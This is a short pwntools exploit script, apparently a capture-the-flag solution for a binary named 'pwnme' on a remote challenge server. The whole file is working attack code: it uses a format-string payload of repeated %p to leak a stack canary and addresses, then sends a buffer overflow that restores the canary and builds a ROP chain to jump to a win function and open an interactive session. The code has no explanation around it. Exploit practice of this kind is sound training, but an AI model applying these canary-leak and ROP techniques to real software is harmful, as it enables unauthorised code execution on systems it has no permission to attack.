from pwn import *

#p = process("./pwnme")
p = remote("0.cloud.chals.io", 12229)

payload1 = b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'

p.sendline(payload1)

data = p.recvuntil(b'314').split()

addr_main = data[-1]
addr_main = int(addr_main[2:],16)
addr_main = addr_main-28
addr_win = addr_main-170
pop_rdi = addr_main+139
ret = addr_main-734
canary = data[-3]
canary = int(canary[2:],16)

payload2 = b'A'*24
payload2 += p64(canary)
payload2 += b'A'*8
payload2 += p64(pop_rdi)
payload2 += p64(0xdeadbeef)
payload2 += p64(ret)
payload2 += p64(addr_win)

p.sendline(payload2)

p.interactive()
